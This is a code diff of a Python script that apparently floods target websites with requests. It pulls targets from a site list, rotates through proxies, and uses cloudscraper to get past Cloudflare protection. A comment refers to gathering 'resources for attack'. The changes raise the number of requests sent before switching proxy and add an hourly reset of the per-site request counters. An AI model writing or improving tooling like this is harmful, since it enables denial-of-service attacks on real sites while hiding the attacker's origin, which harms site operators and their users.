@@ -1,4 +1,5 @@
 # -*- coding: utf-8 -*-
+from datetime import datetime, timedelta
 import json
 
 import cloudscraper
@@ -63,7 +64,7 @@ def generate_MIR_data(url):
     return dat
 
 
-def mainth(protocol, ip, proxy_name, region, queue_counters):
+def mainth(protocol, cur_proxy, proxy_name, region, queue_counters):
     # Fetching data with proxy and targets
     sites = get_sites()
 
@@ -73,10 +74,11 @@ def mainth(protocol, ip, proxy_name, region, queue_counters):
 
     while True:
         counter_total += 1
-        if counter_total > 1000:
+        if counter_total > 10000:
             sites = get_sites()
             proxies = get_proxies()
-            (protocol, ip, proxy_name, region) = choice(proxies)
+            (protocol, cur_proxy, proxy_name, region) = choice(proxies)
+            logger.info("NEW PROXY SELECTED")
         scraper = base_scraper()
         # logger.info("GET RESOURCES FOR ATTACK")
         # data = choice(sites)
@@ -98,7 +100,6 @@ def mainth(protocol, ip, proxy_name, region, queue_counters):
             sites.pop(index_)
             continue
 
-        cur_proxy = ip
         scraper.proxies.update({'http': cur_proxy,
                                 'https': cur_proxy})
 
@@ -168,6 +169,7 @@ def get_proxies():
 
 def stat_visualiser(queue_counters):
     counter_by_sites = {}
+    reset_time = datetime.now() + timedelta(minutes=60)
     while True:
         while queue_counters.qsize() > 0:
             rec = queue_counters.get(block=True)
@@ -181,6 +183,9 @@ def stat_visualiser(queue_counters):
             queue_counters.task_done()
         logger.info(json.dumps(counter_by_sites, indent=4))
         time.sleep(5)
+        if datetime.now() > reset_time:
+            counter_by_sites = {}
+            reset_time = datetime.now() + timedelta(minutes=60)
         os.system('clear')
 
 
